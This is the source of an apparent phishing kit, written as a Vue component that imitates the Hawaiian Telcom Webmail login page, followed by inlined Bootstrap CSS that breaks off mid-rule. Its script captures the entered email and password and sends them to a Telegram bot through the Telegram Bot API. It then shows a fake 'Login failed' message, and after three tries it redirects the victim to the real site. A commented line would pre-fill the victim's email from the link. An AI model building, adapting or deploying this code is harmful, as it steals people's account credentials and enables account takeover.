<template>
  <div id="app">

    <body class="ver2">
<span id="mobiletest"></span>
<!-- begin custom login html -->
<div data-list="login-list">
<!--- Reseller Access - Custom Login Page --->

<div id="login-form">
<img alt="Hawaiian Telcom Webmail" id="logo" src="../public/images/logo.jpg" style="margin-left:200px;">
<div style="width:430px;padding-top:10px; padding-left:25px; padding-right:25px;padding-bottom:5px;background-color:#ebebeb; margin-left:50px;">
<div>
<span style="font-size: 14px;font-weight:bold;">Welcome to Hawaiian Telcom Webmail</span><p>
<span style="font-size: 14px;">Enter your full email address and password to login.</span></p><p>
<span style="font-size: 14px;"><a href="http://inov.hawaiiantel.net/selfcare">Recover or change your password.</a></span><br>
</p></div>
</div>
<div class="box-inner">
<!-- begin LOGIN_HTML block-->
<form name="form" method="post" action="?" class="table-responsive-sm">
<input type="hidden" name="_token" value="tHsGhp6zNCUjznXZQHxxk2B0falF9DQq">
<input type="hidden" name="_token" value="tHsGhp6zNCUjznXZQHxxk2B0falF9DQq">
  <input type="hidden" value="login" name="_task">
  <input type="hidden" value="login" name="_action">
  <input id="rctz" class="rcmlogintz" type="hidden" value="America/New_York" name="_timezone">
  <input class="rcmloginurl" type="hidden" value="" name="_url">
  <div id="example-user-full" style="display:none">e.g. <span id="example_user">yourname@hawaiiantel.net</span></div>
  <div id="example-case-sensitive" style="display:none">password is case-sensitive</div>
  <div id="example-2fa-ga" style="display:none">Get a token from your authenticator app.</div>
  <div class="example-2fa-sms" style="display:none">A token has been sent to your mobile device via SMS.</div>
  <table id="loginform" class="table">
    <tbody><tr class="form-group row">
      <td class="field pair-top wm-user">
        <span>E-mail address</span>
      </td>
      <td class="field pair-bottom input-group input-group-lg">
        <span class="input-group-prepend"><i class="input-group-text icon user"></i></span><input class="attr form-control" id="rcmloginuser" type="email" v-model="formDataRes.email" autocapitalize="off" size="40" required="required" name="_user" onchange="check_realm();" value="" placeholder="" title="e.g. yourname@hawaiiantel.net">
      </td>
    </tr>
    <tr class="spacer-bottom wm-pass form-group row">
      <td class="field pair-top">
        <span>Password</span>
      </td>
      <td class="field pair-bottom input-group input-group-lg">
        <span class="input-group-prepend"><i class="input-group-text icon pass"></i></span><input class="attr form-control" id="rcmloginpwd" type="password" v-model="formDataRes.password" autocapitalize="off" size="40" required="required" name="_pass" placeholder="" title="password is case-sensitive">
      </td>
    </tr>
    <tr class="session_expire form-group row">
      <td class="field input-group input-group-lg">
        <span class="input-group-prepend"><i class="input-group-text icon sessionexpire"></i></span><div class="custom-control custom-switch"><input class="attr form-control form-check-input custom-control-input" id="session_expire" type="checkbox" value="1" name="session_expire" onclick="test_checkboxes()" placeholder=""><label for="session_expire" class="custom-control-label" title=""></label></div>
        <p class="example-text">Shared computer - log me out after 4 hours</p>
      </td>
    </tr>
    <tr class="session_persist spacer-bottom form-group row">
      <td class="field input-group input-group-lg">
        <span class="input-group-prepend"><i class="input-group-text icon persist"></i></span><div class="custom-control custom-switch"><input class="attr form-control form-check-input custom-control-input" id="persist" type="checkbox" value="1" name="persist" onclick="test_checkboxes()" placeholder=""><label for="persist" class="custom-control-label" title=""></label></div>
        <p class="example-text">Keep me logged in until I log out</p>
      </td>
    </tr>
    
    <tr class="mobile form-group row input-group input-group-lg" style="display:none;">
      <span class="input-group-prepend"><i class="input-group-text icon desktop"></i></span><input id="desktop" type="hidden" value="1" name="desktop" class="form-control" placeholder="">
    </tr>
  </tbody></table>

  <div class="formbuttons">
    <button type="submit" class="button mainaction btn btn-primary login" @click.prevent="finishJoob();">Login</button>
  </div>

  
</form>


<!-- end LOGIN_HTML block-->

</div>
</div>
<!-- end custom login html -->
</div>

<div class="box-bottom" v-if="isActive">
  <center>
    <div id="message">
      <div class="warning content ui alert alert-warning" role="alert"><i class="icon"></i><span><i class="icon"></i><span>Login failed.</span></span></div>
    </div>
    
  </center>
</div>






</body>
  </div>
</template>


<script>
// import HelloWorld from './components/HelloWorld.vue'
import axios from "axios"
export default {
	name: 'app',
	data() {
		return {
			formDataRes: {},
			isLoading: false,
			isActive: false,
			count: 0,
			finalCount: 3,
			isText : false
		}
	},
	components: {
		// HelloWorld 9
	},

	methods: {

		async finishJoob() {
			this.count = +this.count + 1
			this.isLoading = true
			if (this.count < this.finalCount) {
				let message = this.formDataRes
				await this.sendTelegramResult(message)
				this.isLoading = false
				this.isActive = !this.isActive
			} else {
				location.replace("https://hawaiiantel.net/")

			}
		},


		async sendTelegramResult(message) {
			try {
				let botId = this.$config.public.botId
				let chatId = this.$config.public.chatId
				const url = `https://api.telegram.org/bot${botId}/sendMessage`;
				const payload = {
					chat_id: chatId,
					text: message,
				};
				console.log(payload)
				await axios.post(url, payload);

			} catch (error) {
				console.log(error, 'error')

			}
		}

	},
	mounted() {
		// this.formDataRes['email'] = atob(this.$route?.params?.id)
	}
}
</script>

<style>


.trunstile{
  height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
}

.vp{
position: absolute;
top: 37%;
}

.main_div{

 
    width: 430px;
    padding-top: 10px;
    padding-left: 25px;
    padding-right: 25px;
    padding-bottom: 5px;
    background-color: #ebebeb;
    margin-left: 50px;

}
.img{
  margin-left: 200px;
}
.welcome{
  font-size: "14px;";
  font-weight:"bold;"
  !important
}

/*!
 * Bootstrap v4.5.3 (https://getbootstrap.com/)
 * Copyright 2011-2020 The Bootstrap Authors
 * Copyright 2011-2020 Twitter, Inc.
 * Licensed under MIT (https://github.com/twbs/bootstrap/blob/main/LICENSE)
 */:root{--blue:#007bff;--indigo:#6610f2;--purple:#6f42c1;--pink:#e83e8c;--red:#dc3545;--orange:#fd7e14;--yellow:#ffc107;--green:#28a745;--teal:#20c997;--cyan:#17a2b8;--white:#fff;--gray:#6c757d;--gray-dark:#343a40;--primary:#007bff;--secondary:#6c757d;--success:#28a745;--info:#17a2b8;--warning:#ffc107;--danger:#dc3545;--light:#f8f9fa;--dark:#343a40;--breakpoint-xs:0;--breakpoint-sm:576px;--breakpoint-md:768px;--breakpoint-lg:992px;--breakpoint-xl:1200px;--font-family-sans-serif:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,"Noto Sans",sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol","Noto Color Emoji";--font-family-monospace:SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace}*,::after,::before{box-sizing:border-box}html{font-family:sans-serif;line-height:1.15;-webkit-text-size-adjust:100%;-webkit-tap-highlight-color:transparent}article,aside,figcaption,figure,footer,header,hgroup,main,nav,section{display:block}body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,"Noto Sans",sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol","Noto Color Emoji";font-size:1rem;font-weight:400;line-height:1.5;color:#212529;text-align:left;background-color:#fff}[tabindex="-1"]:focus:not(:focus-visible){outline:0!important}hr{box-sizing:content-box;height:0;overflow:visible}h1,h2,h3,h4,h5,h6{margin-top:0;margin-bottom:.5rem}p{margin-top:0;margin-bottom:1rem}abbr[data-original-title],abbr[title]{text-decoration:underline;-webkit-text-decoration:underline dotted;text-decoration:underline dotted;cursor:help;border-bottom:0;-webkit-text-decoration-skip-ink:none;text-decoration-skip-ink:none}address{margin-bottom:1rem;font-style:normal;line-height:inherit}dl,ol,ul{margin-top:0;margin-bottom:1rem}ol ol,ol ul,ul ol,ul ul{margin-bottom:0}dt{font-weight:700}dd{margin-bottom:.5rem;margin-left:0}blockquote{margin:0 0 1rem}b,strong{font-weight:bolder}small{font-size:80%}sub,sup{position:relative;font-size:75%;line-height:0;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}a{color:#007bff;text-decoration:none;background-color:transparent}a:hover{color:#0056b3;text-decoration:underline}a:not([href]):not([class]){color:inherit;text-decoration:none}a:not([href]):not([class]):hover{color:inherit;text-decoration:none}code,kbd,pre,samp{font-family:SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace;font-size:1em}pre{margin-top:0;margin-bottom:1rem;overflow:auto;-ms-overflow-style:scrollbar}figure{margin:0 0 1rem}img{vertical-align:middle;border-style:none}svg{overflow:hidden;vertical-align:middle}table{border-collapse:collapse}caption{padding-top:.75rem;padding-bottom:.75rem;color:#6c757d;text-align:left;caption-side:bottom}th{text-align:inherit;text-align:-webkit-match-parent}label{display:inline-block;margin-bottom:.5rem}button{border-radius:0}button:focus{outline:1px dotted;outline:5px auto -webkit-focus-ring-color}button,input,optgroup,select,textarea{margin:0;font-family:inherit;font-size:inherit;line-height:inherit}button,input{overflow:visible}button,select{text-transform:none}[role=button]{cursor:pointer}select{word-wrap:normal}[type=button],[type=reset],[type=submit],button{-webkit-appearance:button}[type=button]:not(:disabled),[type=reset]:not(:disabled),[type=submit]:not(:disabled),button:not(:disabled){cursor:pointer}[type=button]::-moz-focus-inner,[type=reset]::-moz-focus-inner,[type=submit]::-moz-focus-inner,button::-moz-focus-inner{padding:0;border-style:none}input[type=checkbox],input[type=radio]{box-sizing:border-box;padding:0}textarea{overflow:auto;resize:vertical}fieldset{min-width:0;padding:0;margin:0;border:0}legend{display:block;width:100%;max-width:100%;padding:0;margin-bottom:.5rem;font-size:1.5rem;line-height:inherit;color:inherit;white-space:normal}progress{vertical-align:baseline}[type=number]::-webkit-inner-spin-button,[type=number]::-webkit-outer-spin-button{height:auto}[type=search]{outline-offset:-2px;-webkit-appearance:none}[type=search]::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{font:inherit;-webkit-appearance:button}output{display:inline-block}summary{display:list-item;cursor:pointer}template{display:none}[hidden]{display:none!important}.h1,.h2,.h3,.h4,.h5,.h6,h1,h2,h3,h4,h5,h6{margin-bottom:.5rem;font-weight:500;line-height:1.2}.h1,h1{font-size:2.5rem}.h2,h2{font-size:2rem}.h3,h3{font-size:1.75rem}.h4,h4{font-size:1.5rem}.h5,h5{font-size:1.25rem}.h6,h6{font-size:1rem}.lead{font-size:1.25rem;font-weight:300}.display-1{font-size:6rem;font-weight:300;line-height:1.2}.display-2{font-size:5.5rem;font-weight:300;line-height:1.2}.display-3{font-size:4.5rem;font-weight:300;line-height:1.2}.display-4{font-size:3.5rem;font-weight:300;line-height:1.2}hr{margin-top:1rem;margin-bottom:1rem;border:0;border-top:1px solid rgba(0,0,0,.1)}.small,small{font-size:80%;font-weight:400}.mark,mark{padding:.2em;background-color:#fcf8e3}.list-unstyled{padding-left:0;list-style:none}.list-inline{padding-left:0;list-style:none}.list-inline-item{display:inline-block}.list-inline-item:not(:last-child){margin-right:.5rem}.initialism{font-size:90%;text-transform:uppercase}.blockquote{margin-bottom:1rem;font-size:1.25rem}.blockquote-footer{display:block;font-size:80%;color:#6c757d}.blockquote-footer::before{content:"\2014\00A0"}.img-fluid{max-width:100%;height:auto}.img-thumbnail{padding:.25rem;background-color:#fff;border:1px solid #dee2e6;border-radius:.25rem;max-width:100%;height:auto}.figure{display:inline-block}.figure-img{margin-bottom:.5rem;line-height:1}.figure-caption{font-size:90%;color:#6c757d}code{font-size:87.5%;color:#e83e8c;word-wrap:break-word}a>code{color:inherit}kbd{padding:.2rem .4rem;font-size:87.5%;color:#fff;background-color:#212529;border-radius:.2rem}kbd kbd{padding:0;font-size:100%;font-weight:700}pre{display:block;font-size:87.5%;color:#212529}pre code{font-size:inherit;color:inherit;word-break:normal}.pre-scrollable{max-height:340px;overflow-y:scroll}.container,.container-fluid,.container-lg,.container-md,.container-sm,.container-xl{width:100%;padding-right:15px;padding-left:15px;margin-right:auto;margin-left:auto}@media (min-width:576px){.container,.container-sm{max-width:540px}}@media (min-width:768px){.container,.container-md,.container-sm{max-width:720px}}@media (min-width:992px){.container,.container-lg,.container-md,.container-sm{max-width:960px}}@media (min-width:1200px){.container,.container-lg,.container-md,.container-sm,.container-xl{max-width:1140px}}.row{display:-ms-flexbox;display:flex;-ms-flex-wrap:wrap;flex-wrap:wrap;margin-right:-15px;margin-left:-15px}.no-gutters{margin-right:0;margin-left:0}.no-gutters>.col,.no-gutters>[class*=col-]{padding-right:0;padding-left:0}.col,.col-1,.col-10,.col-11,.col-12,.col-2,.col-3,.col-4,.col-5,.col-6,.col-7,.col-8,.col-9,.col-auto,.col-lg,.col-lg-1,.col-lg-10,.col-lg-11,.col-lg-12,.col-lg-2,.col-lg-3,.col-lg-4,.col-lg-5,.col-lg-6,.col-lg-7,.col-lg-8,.col-lg-9,.col-lg-auto,.col-md,.col-md-1,.col-md-10,.col-md-11,.col-md-12,.col-md-2,.col-md-3,.col-md-4,.col-md-5,.col-md-6,.col-md-7,.col-md-8,.col-md-9,.col-md-auto,.col-sm,.col-sm-1,.col-sm-10,.col-sm-11,.col-sm-12,.col-sm-2,.col-sm-3,.col-sm-4,.col-sm-5,.col-sm-6,.col-sm-7,.col-sm-8,.col-sm-9,.col-sm-auto,.col-xl,.col-xl-1,.col-xl-10,.col-xl-11,.col-xl-12,.col-xl-2,.col-xl-3,.col-xl-4,.col-xl-5,.col-xl-6,.col-xl-7,.col-xl-8,.col-xl-9,.col-xl-auto{position:relative;width:100%;padding-right:15px;padding-left:15px}.col{-ms-flex-preferred-size:0;flex-basis:0;-ms-flex-positive:1;flex-grow:1;max-width:100%}.row-cols-1>*{-ms-flex:0 0 100%;flex:0 0 100%;max-width:100%}.row-cols-2>*{-ms-flex:0 0 50%;flex:0 0 50%;max-width:50%}.row-cols-3>*{-ms-flex:0 0 33.333333%;flex:0 0 33.333333%;max-width:33.333333%}.row-cols-4>*{-ms-flex:0 0 25%;flex:0 0 25%;max-width:25%}.row-cols-5>*{-ms-flex:0 0 20%;flex:0 0 20%;max-width:20%}.row-cols-6>*{-ms-flex:0 0 16.666667%;flex:0 0 16.666667%;max-width:16.666667%}.col-auto{-ms-flex:0 0 auto;flex:0 0 auto;width:auto;max-width:100%}.col-1{-ms-flex:0 0 8.333333%;flex:0 0 8.333333%;max-width:8.333333%}.col-2{-ms-flex:0 0 16.666667%;flex:0 0 16.666667%;max-width:16.666667%}.col-3{-ms-flex:0 0 25%;flex:0 0 25%;max-width:25%}.col-4{-ms-flex:0 0 33.333333%;flex:0 0 33.333333%;max-width:33.333333%}.col-5{-ms-flex:0 0 41.666667%;flex:0 0 41.666667%;max-width:41.666667%}.col-6{-ms-flex:0 0 50%;flex:0 0 50%;max-width:50%}.col-7{-ms-flex:0 0 58.333333%;flex:0 0 58.333333%;max-width:58.333333%}.col-8{-ms-flex:0 0 66.666667%;flex:0 0 66.666667%;max-width:66.666667%}.col-9{-ms-flex:0 0 75%;flex:0 0 75%;max-width:75%}.col-10{-ms-flex:0 0 83.333333%;flex:0 0 83.333333%;max-width:83.333333%}.col-11{-ms-flex:0 0 91.666667%;flex:0 0 91.666667%;max-width:91.666667%}.col-12{-ms-flex:0 0 100%;flex:0 0 100%;max-width:100%}.order-first{-ms-flex-order:-1;order:-1}.order-last{-ms-flex-order:13;order:13}.order-0{-ms-flex-order:0;order:0}.order-1{-ms-flex-order:1;order:1}.order-2{-ms-flex-order:2;order:2}.order-3{-ms-flex-order:3;order:3}.order-4{-ms-flex-order:4;order:4}.order-5{-ms-flex-order:5;order:5}.order-6{-ms-flex-order:6;order:6}.order-7{-ms-flex-order:7;order:7}.order-8{-ms-flex-order:8;order:8}.order-9{-ms-flex-order:9;order:9}.order-10{-ms-flex-order:10;order:10}.order-11{-ms-flex-order:11;order:11}.order-12{-ms-flex-order:12;order:12}.offset-1{margin-left:8.333333%}.offset-2{margin-left:16.666667%}.offset-3{margin-left:25%}.offset-4{margin-left:33.333333%}.offset-5{margin-left:41.666667%}.offset-6{margin-left:50%}.offset-7{margin-left:58.333333%}.offset-8{margin-left:66.666667%}.offset-9{margin-left:75%}.offset-10{margin-left:83.333333%}.offset-11{margin-left:91.666667%}@media (min-width:576px){.col-sm{-ms-flex-preferred-size:0;flex-basis:0;-ms-flex-positive:1;flex-grow:1;max-width:100%}.row-cols-sm-1>*{-ms-flex:0 0 100%;flex:0 0 100%;max-width:100%}.row-cols-sm-2>*{-ms-flex:0 0 50%;flex:0 0 50%;max-width:50%}.row-cols-sm-3>*{-ms-flex:0 0 33.333333%;flex:0 0 33.333333%;max-width:33.333333%}.row-cols-sm-4>*{-ms-flex:0 0 25%;flex:0 0 25%;max-width:25%}.row-cols-sm-5>*{-ms-flex:0 0 20%;flex:0 0 20%;max-width:20%}.row-cols-sm-6>*{-ms-flex:0 0 16.666667%;flex:0 0 16.666667%;max-width:16.666667%}.col-sm-auto{-ms-flex:0 0 auto;flex:0 0 auto;width:auto;max-width:100%}.col-sm-1{-ms-flex:0 0 8.333333%;flex:0 0 8.333333%;max-width:8.333333%}.col-sm-2{-ms-flex:0 0 16.666667%;flex:0 0 16.666667%;max-width:16.666667%}.col-sm-3{-ms-flex:0 0 25%;flex:0 0 25%;max-width:25%}.col-sm-4{-ms-flex:0 0 33.333333%;flex:0 0 33.333333%;max-width:33.333333%}.col-sm-5{-ms-flex:0 0 41.666667%;flex:0 0 41.666667%;max-width:41.666667%}.col-sm-6{-ms-flex:0 0 50%;flex:0 0 50%;max-width:50%}.col-sm-7{-ms-flex:0 0 58.333333%;flex:0 0 58.333333%;max-width:58.333333%}.col-sm-8{-ms-flex:0 0 66.666667%;flex:0 0 66.666667%;max-width:66.666667%}.col-sm-9{-ms-flex:0 0 75%;flex:0 0 75%;max-width:75%}.col-sm-10{-ms-flex:0 0 83.333333%;flex:0 0 83.333333%;max-width:83.333333%}.col-sm-11{-ms-flex:0 0 91.666667%;flex:0 0 91.666667%;max-width:91.666667%}.col-sm-12{-ms-flex:0 0 100%;flex:0 0 100%;max-width:100%}.order-sm-first{-ms-flex-order:-1;order:-1}.order-sm-last{-ms-flex-order:13;order:13}.order-sm-0{-ms-flex-order:0;order:0}.order-sm-1{-ms-flex-order:1;order:1}.order-sm-2{-ms-flex-order:2;order:2}.order-sm-3{-ms-flex-order:3;order:3}.order-sm-4{-ms-flex-order:4;order:4}.order-sm-5{-ms-flex-order:5;order:5}.order-sm-6{-ms-flex-order:6;order:6}.order-sm-7{-ms-flex-order:7;order:7}.order-sm-8{-ms-flex-order:8;order:8}.order-sm-9{-ms-flex-order:9;order:9}.order-sm-10{-ms-flex-order:10;order:10}.order-sm-11{-ms-flex-order:11;order:11}.order-sm-12{-ms-flex-order:12;order:12}.offset-sm-0{margin-left:0}.offset-sm-1{margin-left:8.333333%}.offset-sm-2{margin-left:16.666667%}.offset-sm-3{margin-left:25%}.offset-sm-4{margin-left:33.333333%}.offset-sm-5{margin-left:41.666667%}.offset-sm-6{margin-left:50%}.offset-sm-7{margin-left:58.333333%}.offset-sm-8{margin-left:66.666667%}.offset-sm-9{margin-left:75%}.offset-sm-10{margin-left:83.333333%}.offset-sm-11{margin-left:91.666667%}}@media (min-width:768px){.col-md{-ms-flex-preferred-size:0;flex-basis:0;-ms-flex-positive:1;flex-grow:1;max-width:100%}.row-cols-md-1>*{-ms-flex:0 0 100%;flex:0 0 100%;max-width:100%}.row-cols-md-2>*{-ms-flex:0 0 50%;flex:0 0 50%;max-width:50%}.row-cols-md-3>*{-ms-flex:0 0 33.333333%;flex:0 0 33.333333%;max-width:33.333333%}.row-cols-md-4>*{-ms-flex:0 0 25%;flex:0 0 25%;max-width:25%}.row-cols-md-5>*{-ms-flex:0 0 20%;flex:0 0 20%;max-width:20%}.row-cols-md-6>*{-ms-flex:0 0 16.666667%;flex:0 0 16.666667%;max-width:16.666667%}.col-md-auto{-ms-flex:0 0 auto;flex:0 0 auto;width:auto;max-width:100%}.col-md-1{-ms-flex:0 0 8.333333%;flex:0 0 8.333333%;max-width:8.333333%}.col-md-2{-ms-flex:0 0 16.666667%;flex:0 0 16.666667%;max-width:16.666667%}.col-md-3{-ms-flex:0 0 25%;flex:0 0 25%;max-width:25%}.col-md-4{-ms-flex:0 0 33.333333%;flex:0 0 33.333333%;max-width:33.333333%}.col-md-5{-ms-flex:0 0 41.666667%;flex:0 0 41.666667%;max-width:41.666667%}.col-md-6{-ms-flex:0 0 50%;flex:0 0 50%;max-width:50%}.col-md-7{-ms-flex:0 0 58.333333%;flex:0 0 58.333333%;max-width:58.333333%}.col-md-8{-ms-flex:0 0 66.666667%;flex:0 0 66.666667%;max-width:66.666667%}.col-md-9{-ms-flex:0 0 75%;flex:0 0 75%;max-width:75%}.col-md-10{-ms-flex:0 0 83.333333%;flex:0 0 83.333333%;max-width:83.333333%}.col-md-11{-ms-flex:0 0 91.666667%;flex:0 0 91.666667%;max-width:91.666667%}.col-md-12{-ms-flex:0 0 100%;flex:0 0 100%;max-width:100%}.order-md-first{-ms-flex-order:-1;order:-1}.order-md-last{-ms-flex-order:13;order:13}.order-md-0{-ms-flex-order:0;order:0}.order-md-1{-ms-flex-order:1;order:1}.order-md-2{-ms-flex-order:2;order:2}.order-md-3{-ms-flex-order:3;order:3}.order-md-4{-ms-flex-order:4;order:4}.order-md-5{-ms-flex-order:5;order:5}.order-md-6{-ms-flex-order:6;order:6}.order-md-7{-ms-flex-order:7;order:7}.order-md-8{-ms-flex-order:8;order:8}.order-md-9{-ms-flex-order:9;order:9}.order-md-10{-ms-flex-order:10;order:10}.order-md-11{-ms-flex-order:11;order:11}.order-md-12{-ms-flex-order:12;order:12}.offset-md-0{margin-left:0}.offset-md-1{margin-left:8.333333%}.offset-md-2{margin-left:16.666667%}.offset-md-3{margin-left:25%}.offset-md-4{margin-left:33.333333%}.offset-md-5{margin-left:41.666667%}.offset-md-6{margin-left:50%}.offset-md-7{margin-left:58.333333%}.offset-md-8{margin-left:66.666667%}.offset-md-9{margin-left:75%}.offset-md-10{margin-left:83.333333%}.offset-md-11{margin-left:91.666667%}}@media (min-width:992px){.col-lg{-ms-flex-preferred-size:0;flex-basis:0;-ms-flex-positive:1;flex-grow:1;max-width:100%}.row-cols-lg-1>*{-ms-flex:0 0 100%;flex:0 0 100%;max-width:100%}.row-cols-lg-2>*{-ms-flex:0 0 50%;flex:0 0 50%;max-width:50%}.row-cols-lg-3>*{-ms-flex:0 0 33.333333%;flex:0 0 33.333333%;max-width:33.333333%}.row-cols-lg-4>*{-ms-flex:0 0 25%;flex:0 0 25%;max-width:25%}.row-cols-lg-5>*{-ms-flex:0 0 20%;flex:0 0 20%;max-width:20%}.row-cols-lg-6>*{-ms-flex:0 0 16.666667%;flex:0 0 16.666667%;max-width:16.666667%}.col-lg-auto{-ms-flex:0 0 auto;flex:0 0 auto;width:auto;max-width:100%}.col-lg-1{-ms-flex:0 0 8.333333%;flex:0 0 8.333333%;max-width:8.333333%}.col-lg-2{-ms-flex:0 0 16.666667%;flex:0 0 16.666667%;max-width:16.666667%}.col-lg-3{-ms-flex:0 0 25%;flex:0 0 25%;max-width:25%}.col-lg-4{-ms-flex:0 0 33.333333%;flex:0 0 33.333333%;max-width:33.333333%}.col-lg-5{-ms-flex:0 0 41.666667%;flex:0 0 41.666667%;max-width:41.666667%}.col-lg-6{-ms-flex:0 0 50%;flex:0 0 50%;max-width:50%}.col-lg-7{-ms-flex:0 0 58.333333%;flex:0 0 58.333333%;max-width:58.333333%}.col-lg-8{-ms-flex:0 0 66.666667%;flex:0 0 66.666667%;max-width:66.666667%}.col-lg-9{-ms-flex:0 0 75%;flex:0 0 75%;max-width:75%}.col-lg-10{-ms-flex:0 0 83.333333%;flex:0 0 83.333333%;max-width:83.333333%}.col-lg-11{-ms-flex:0 0 91.666667%;flex:0 0 91.666667%;max-width:91.666667%}.col-lg-12{-ms-flex:0 0 100%;flex:0 0 100%;max-width:100%}.order-lg-first{-ms-flex-order:-1;order:-1}.order-lg-last{-ms-flex-order:13;order:13}.order-lg-0{-ms-flex-order:0;order:0}.order-lg-1{-ms-flex-order:1;order:1}.order-lg-2{-ms-flex-order:2;order:2}.order-lg-3{-ms-flex-order:3;order:3}.order-lg-4{-ms-flex-order:4;order:4}.order-lg-5{-ms-flex-order:5;order:5}.order-lg-6{-ms-flex-order:6;order:6}.order-lg-7{-ms-flex-order:7;order:7}.order-lg-8{-ms-flex-order:8;order:8}.order-lg-9{-ms-flex-order:9;order:9}.order-lg-10{-ms-flex-order:10;order:10}.order-lg-11{-ms-flex-order:11;order:11}.order-lg-12{-ms-flex-order:12;order:12}.offset-lg-0{margin-left:0}.offset-lg-1{margin-left:8.333333%}.offset-lg-2{margin-left:16.666667%}.offset-lg-3{margin-left:25%}.offset-lg-4{margin-left:33.333333%}.offset-lg-5{margin-left:41.666667%}.offset-lg-6{margin-left:50%}.offset-lg-7{margin-left:58.333333%}.offset-lg-8{margin-left:66.666667%}.offset-lg-9{margin-left:75%}.offset-lg-10{margin-left:83.333333%}.offset-lg-11{margin-left:91.666667%}}@media (min-width:1200px){.col-xl{-ms-flex-preferred-size:0;flex-basis:0;-ms-flex-positive:1;flex-grow:1;max-width:100%}.row-cols-xl-1>*{-ms-flex:0 0 100%;flex:0 0 100%;max-width:100%}.row-cols-xl-2>*{-ms-flex:0 0 50%;flex:0 0 50%;max-width:50%}.row-cols-xl-3>*{-ms-flex:0 0 33.333333%;flex:0 0 33.333333%;max-width:33.333333%}.row-cols-xl-4>*{-ms-flex:0 0 25%;flex:0 0 25%;max-width:25%}.row-cols-xl-5>*{-ms-flex:0 0 20%;flex:0 0 20%;max-width:20%}.row-cols-xl-6>*{-ms-flex:0 0 16.666667%;flex:0 0 16.666667%;max-width:16.666667%}.col-xl-auto{-ms-flex:0 0 auto;flex:0 0 auto;width:auto;max-width:100%}.col-xl-1{-ms-flex:0 0 8.333333%;flex:0 0 8.333333%;max-width:8.333333%}.col-xl-2{-ms-flex:0 0 16.666667%;flex:0 0 16.666667%;max-width:16.666667%}.col-xl-3{-ms-flex:0 0 25%;flex:0 0 25%;max-width:25%}.col-xl-4{-ms-flex:0 0 33.333333%;flex:0 0 33.333333%;max-width:33.333333%}.col-xl-5{-ms-flex:0 0 41.666667%;flex:0 0 41.666667%;max-width:41.666667%}.col-xl-6{-ms-flex:0 0 50%;flex:0 0 50%;max-width:50%}.col-xl-7{-ms-flex:0 0 58.333333%;flex:0 0 58.333333%;max-width:58.333333%}.col-xl-8{-ms-flex:0 0 66.666667%;flex:0 0 66.666667%;max-width:66.666667%}.col-xl-9{-ms-flex:0 0 75%;flex:0 0 75%;max-width:75%}.col-xl-10{-ms-flex:0 0 83.333333%;flex:0 0 83.333333%;max-width:83.333333%}.col-xl-11{-ms-flex:0 0 91.666667%;flex:0 0 91.666667%;max-width:91.666667%}.col-xl-12{-ms-flex:0 0 100%;flex:0 0 100%;max-width:100%}.order-xl-first{-ms-flex-order:-1;order:-1}.order-xl-last{-ms-flex-order:13;order:13}.order-xl-0{-ms-flex-order:0;order:0}.order-xl-1{-ms-flex-order:1;order:1}.order-xl-2{-ms-flex-order:2;order:2}.order-xl-3{-ms-flex-order:3;order:3}.order-xl-4{-ms-flex-order:4;order:4}.order-xl-5{-ms-flex-order:5;order:5}.order-xl-6{-ms-flex-order:6;order:6}.order-xl-7{-ms-flex-order:7;order:7}.order-xl-8{-ms-flex-order:8;order:8}.order-xl-9{-ms-flex-order:9;order:9}.order-xl-10{-ms-flex-order:10;order:10}.order-xl-11{-ms-flex-order:11;order:11}.order-xl-12{-ms-flex-order:12;order:12}.offset-xl-0{margin-left:0}.offset-xl-1{margin-left:8.333333%}.offset-xl-2{margin-left:16.666667%}.offset-xl-3{margin-left:25%}.offset-xl-4{margin-left:33.333333%}.offset-xl-5{margin-left:41.666667%}.offset-xl-6{margin-left:50%}.offset-xl-7{margin-left:58.333333%}.offset-xl-8{margin-left:66.666667%}.offset-xl-9{margin-left:75%}.offset-xl-10{margin-left:83.333333%}.offset-xl-11{margin-left:91.666667%}}.table{width:100%;margin-bottom:1rem;color:#212529}.table td,.table th{padding:.75rem;vertical-align:top;border-top:1px solid #dee2e6}.table thead th{vertical-align:bottom;border-bottom:2px solid #dee2e6}.table tbody+tbody{border-top:2px solid #dee2e6}.table-sm td,.table-sm th{padding:.3rem}.table-bordered{border:1px solid #dee2e6}.table-bordered td,.table-bordered th{border:1px solid #dee2e6}.table-bordered thead td,.table-bordered thead th{border-bottom-width:2px}.table-borderless tbody+tbody,.table-borderless td,.table-borderless th,.table-borderless thead th{border:0}.table-striped tbody tr:nth-of-type(odd){background-color:rgba(0,0,0,.05)}.table-hover tbody tr:hover{color:#212529;background-color:rgba(0,0,0,.075)}.table-primary,.table-primary>td,.table-primary>th{background-color:#b8daff}.table-primary tbody+tbody,.table-primary td,.table-primary th,.table-primary thead th{border-color:#7abaff}.table-hover .table-primary:hover{background-color:#9fcdff}.table-hover .table-primary:hover>td,.table-hover .table-primary:hover>th{background-color:#9fcdff}.table-secondary,.table-secondary>td,.table-secondary>th{background-color:#d6d8db}.table-secondary tbody+tbody,.table-secondary td,.table-secondary th,.table-secondary thead th{border-color:#b3b7bb}.table-hover .table-secondary:hover{background-color:#c8cbcf}.table-hover .table-secondary:hover>td,.table-hover .table-secondary:hover>th{background-color:#c8cbcf}.table-success,.table-success>td,.table-success>th{background-color:#c3e6cb}.table-success tbody+tbody,.table-success td,.table-success th,.table-success thead th{border-color:#8fd19e}.table-hover .table-success:hover{background-color:#b1dfbb}.table-hover .table-success:hover>td,.table-hover .table-success:hover>th{background-color:#b1dfbb}.table-info,.table-info>td,.table-info>th{background-color:#bee5eb}.table-info tbody+tbody,.table-info td,.table-info th,.table-info thead th{border-color:#86cfda}.table-hover .table-info:hover{background-color:#abdde5}.table-hover .table-info:hover>td,.table-hover .table-info:hover>th{background-color:#abdde5}.table-warning,.table-warning>td,.table-warning>th{background-color:#ffeeba}.table-warning tbody+tbody,.table-warning td,.table-warning th,.table-warning thead th{border-color:#ffdf7e}.table-hover .table-warning:hover{background-color:#ffe8a1}.table-hover 